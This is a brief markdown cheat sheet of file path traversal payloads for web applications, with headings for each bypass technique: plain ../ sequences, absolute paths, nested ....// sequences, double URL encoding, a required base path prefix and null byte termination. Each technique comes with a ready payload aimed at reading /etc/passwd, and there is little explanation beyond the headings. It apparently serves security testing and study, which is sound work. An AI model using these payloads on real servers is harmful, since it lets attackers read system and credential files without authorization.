## File path traversal, Directory traversal

### Step up multiple levels

On Unix/linux `../`

On Windows both `../` and `..\`

### Absolute path
`/etc/passwd`

### Nested traversal sequences
`....//` or `....\/`

### URL decode or double decode
`..%252f..%252f..%252fetc/passwd`

### Incude required base path
`/var/www/images/../../../etc/passwd`

### Null byte to terminate stirng
`../../../etc/passwd%00.png`



